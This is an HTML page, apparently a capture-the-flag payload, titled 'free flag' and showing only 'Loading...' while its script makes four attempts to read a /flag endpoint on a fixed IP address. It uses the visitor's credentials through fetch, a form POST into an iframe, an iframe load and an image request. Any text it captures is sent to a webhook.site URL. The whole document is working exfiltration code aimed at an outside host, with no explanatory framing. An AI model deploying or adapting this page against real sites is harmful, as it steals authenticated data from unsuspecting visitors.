<!DOCTYPE html>
<html>
<head>
    <title>free flag</title>
</head>
<body>
<h1>Loading...</h1>

<script>
const WEBHOOK = "https://webhook.site/46a8eb0f-2147-4721-9799-d610a518e0ab";

// ===============================
// Mode 1 — fetch /flag normally
// ===============================
try {
    fetch("https://31.97.187.222:40111/flag", {credentials: "include"})
        .then(r => r.text())
        .then(t => {
            fetch(WEBHOOK + "?mode1=" + encodeURIComponent(t));
        });
} catch (e) {}


// ============================================
// Mode 2 — Form submission leak (POST -> WH)
// ============================================
try {
    let form = document.createElement("form");
    form.action = "https://31.97.187.222:40111/flag";
    form.method = "POST";
    form.target = "leakframe";

    document.body.appendChild(form);

    // iframe to catch flag body
    let iframe = document.createElement("iframe");
    iframe.name = "leakframe";
    iframe.onload = function () {
        try {
            let data = iframe.contentWindow.document.body.innerText;
            fetch(WEBHOOK + "?mode2=" + encodeURIComponent(data));
        } catch (e) {}
    };
    document.body.appendChild(iframe);

    form.submit();
} catch (e) {}


// =====================================================
// Mode 3 — Iframe GET + postMessage capture (CORS leak)
// =====================================================
try {
    let if2 = document.createElement("iframe");
    if2.src = "https://31.97.187.222:40111/flag";
    if2.onload = function () {
        try {
            let inner = if2.contentWindow.document.body.innerText;
            fetch(WEBHOOK + "?mode3=" + encodeURIComponent(inner));
        } catch (e) {}
    };
    document.body.appendChild(if2);
} catch (e) {}


// =============================================================
// Mode 4 — GET /flag?data=... → image load exfil (Query echo)
// (If /flag includes the query in response → we win)
// =============================================================
try {
    let img = new Image();
    img.src = "https://31.97.187.222:40111/flag?x="
        + encodeURIComponent(WEBHOOK + "/mode4");
} catch (e) {}

</script>

</body>
</html>
